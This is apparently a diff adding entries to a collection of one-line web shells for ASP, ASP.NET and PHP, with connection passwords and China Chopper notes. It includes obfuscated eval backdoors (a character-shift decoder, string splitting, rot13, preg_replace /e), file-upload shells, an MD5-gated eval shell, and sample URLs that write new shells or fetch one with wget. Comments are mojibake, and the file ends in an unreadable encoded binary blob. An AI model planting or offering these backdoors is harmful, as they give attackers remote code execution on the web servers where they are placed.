@@ -11,6 +11,38 @@ response.end
 end if
 %>
 ----------------------------------------
+<%Eval(Request(chr(112))):Set fso=CreateObject("Scripting.FileSystemObject"):Set f=fso.GetFile(Request.ServerVariables("PATH_TRANSLATED")):if  f.attributes <> 39 then:f.attributes = 39:end if%>
+----------------------------------------
+<%   
+codeds="Li#uhtxhvw+%{{%,#@%{%#wkhq#hydo#uhtxhvw+%knpmm%,#hqg#li"  
+execute (decode (codeds) )   
+Function DeCode (Coded)   
+    On Error Resume Next  
+    For i = 1 To Len (Coded)   
+        Curchar = Mid (Coded, i, 1)   
+        If Asc (Curchar) = 16 then   
+            Curchar = chr (8)   
+Elseif Asc (Curchar) = 24 then   
+            Curchar = chr (12)   
+Elseif Asc (Curchar) = 32 then   
+            Curchar = chr (18)   
+        Else    
+            Curchar = chr (Asc (Curchar) -3)   
+        End if   
+        DeCode = Decode&Curchar   
+    Next  
+End Function  
+'response.write(decode(codeds)) 
+' ²Ëµ¶Á¬½Ó /hkmjj.asp?xx=x ,ÃÜÂë hkmjj
+%>
+----------------------------------------
+<% 
+dim x1,x2 
+x1 = request("pass") 
+x2 = x1 
+eval x2 
+%>
+----------------------------------------
 <% 
 Function MorfiCoder(Code) 
   MorfiCoder=Replace(Replace(StrReverse(Code),"/*/",""""),"\*\",vbCrlf) 
@@ -43,6 +75,10 @@ Password: z
 ----------------------------------------
 <% @Page Language="Jscript"%><%eval(Request.Item["hucxsz"],"unsafe");%>
 ----------------------------------------
+<%if (Request.Files.Count!=0) { Request.Files[0].SaveAs(Server.MapPath(Request["f"])  ); }%>
+----------------------------------------
+<% If Request.Files.Count <> 0 Then Request.Files(0).SaveAs(Server.MapPath(Request("f")) ) %>
+----------------------------------------
 <script type="text/javascript" language="C#">// <![CDATA[
  WebAdmin2Y.x.y aaaaa = new WebAdmin2Y.x.y("add6bb58e139be10"); // ]]></script>
 Password: webadmin
@@ -55,7 +91,8 @@ Password: webadmin
   var b= eval(str,a); 
   return(b); 
    } 
-</script> 
+</script>
+----------------------------------------
 <% 
 popup(popup(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("UmVxdWVzdC5JdGVtWyJ6Il0=")))); 
 %>
@@ -66,14 +103,50 @@ Password: z
 <%@ Page Language="C#" ValidateRequest="false" %>
 <%try{ System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies["f4ck"].Value))).CreateInstance("c", true, System.Reflection.BindingFlags.Default, null, new object[] { this }, null, null); } catch { }%>
 =====================================================
-					PHPÒ»¾ä»°
+		PHPÒ»¾ä»°
 =====================================================
+----------------------------------------
+<?php $K=sTr_RepLaCe('`','','a`s`s`e`r`t');$M=$_POST[ice];IF($M==NuLl)HeaDeR('Status:404');Else/**/$K($M);?>
+----------------------------------------
+<?php ($www= $_POST['ice']) && @preg_replace('/ad/e','@'.str_rot13('riny').'($www)','add');?>
+----------------------------------------
+<?php ($_=@$_GET[2]).@$_($_POST[1])?>
+caidao: http://site/1.php?2=assert Password: 1
+----------------------------------------
+<?php
+$hh = "p"."r"."e"."g"."_"."r"."e"."p"."l"."a"."c"."e";
+$hh("/[discuz]/e",$_POST['h'],"Access");
+?>
+----------------------------------------
+<?php
+$user="63a9f0ea7bb98050796b649e85481845"; #root
+$pass="7b24afc8bc80e548d66c4e7ff72171c5"; #toor
+
+if (md5($_GET['usr'])==$user && md5($_GET['pass'])==$pass)
+{eval($_GET['idc']);}
+?>
+---------------------------------------
+<?php
+    $func = new ReflectionFunction($_GET[m]);
+    echo $func->invokeArgs(array($_GET[c],$_GET[id]));
+?>
+shell.php?m=file_put_contents&c=test.php&id=<?@eval($_POST[c]);?> //Ð´ÈëÒ»¾ä»°Âí for linux
+shell.php?m=file_put_contents&c=test.php&id=<?php eval($_POST[c]);?> //Ð´ÈëÒ»¾ä»°Âí for windows
+shell.php?m=system&c=echo ^<?php eval^($_POST[c]^);?^> >test.php //ÔÚµ±Ç°Ä¿Â¼ÏÂÃæÉú³ÉÒ»¾ä»°Âí for windows
+shell.php?m=system&c=wget http://xxx.xxx/igenus/images/suffix/test.php //µ±Ç°Ä¿Â¼ÏÂÔØÒ»¾ä»°Âí for linux
+----------------------------------------
+<?php assert($_POST[sb]);?>
+----------------------------------------
+<script language="php">@eval($_POST[sb])</script>
+caidao: <O>h=@eval($_POST1);</O>  Password: sb
+----------------------------------------
 <?php eval($_POST[xiaoma]);?>
 ----------------------------------------
 <?php $_GET['ts7']($_POST['cmd']);?>
 //caidao: http://www.target.com/shell.php?ts7=assert
 ----------------------------------------
-Zend 2004072203 3 148 373 x?
+Zend 
+2004072203 3 148 373 x?
 ?ÕêAùy
 ¾‰yy©•?QÇeldjdjf,JÀÕJinn¥^bJJ?‡ªc 5Ô@\8‡ÂÝÎM
 P¨áP?TÉM?,T?C|€p?ix¡Œ¢Ö?913%1ªJ?2W{ÐH†ÊÆa-c¡’¢p??f¨ü<^€F?N ?#?
